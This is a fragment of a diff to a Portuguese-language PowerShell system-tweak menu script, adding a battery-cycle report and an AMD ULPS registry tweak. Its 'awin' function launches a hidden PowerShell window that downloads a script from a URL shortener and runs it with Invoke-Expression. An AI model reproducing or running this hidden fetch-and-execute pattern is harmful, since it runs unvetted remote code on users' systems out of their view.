+            Write-Host "Não foi possível calcular o estado da bateria." -ForegroundColor Yellow
+        }
+
+        if ($CYCLES -gt 500) {
+            Write-Host "🪫  Bateria já passou de 500 ciclos." -ForegroundColor Yellow
+        }
+        elseif ($CYCLES -gt 0 -and $CYCLES -lt 500) {
+            Write-Host "🔋  Bateria saudável, ciclos: $CYCLES." -ForegroundColor Green
+        }
+        else {
+            Write-Host "⚠️ Falha ao ler o número de ciclos." -ForegroundColor Yellow
+        }       
+    }
+    else {
+        Write-Host "⚠️ Não foi possível gerar o relatório de bateria." -ForegroundColor Red
+    }
+
+    Read-Host "`nPRESSIONE ENTER PARA CONTINUAR"
+}
+
+function AMDULPS {
+    [CmdletBinding()]
+    param(
+        [string]$ClassGuid = '{4d36e968-e325-11ce-bfc1-08002be10318}'
+    )
+    $base = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\$ClassGuid"
+  
+    if (-not (Test-Path $base)) {
+        throw "Chave não encontrada: $base"
+    }
+  
+    Get-ChildItem $base |
+    Where-Object { $_.PSChildName -match '^\d{4}$' } |
+    ForEach-Object {
+        $key = "$base\$($_.PSChildName)"
+        New-ItemProperty -Path $key -Name EnableUlps -PropertyType DWord -Value 0 -Force | Out-Null
+        Write-Verbose "EnableUlps=0 em $($_.PSChildName)"
+    }
+  
+    Write-Host "ULPS desativado. Por favor, reinicie." -ForegroundColor Cyan
+}
+
+  
+function awin {
+    Start-Process powershell -WindowStyle Hidden { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
 }
     
 DISPLAYMENU 
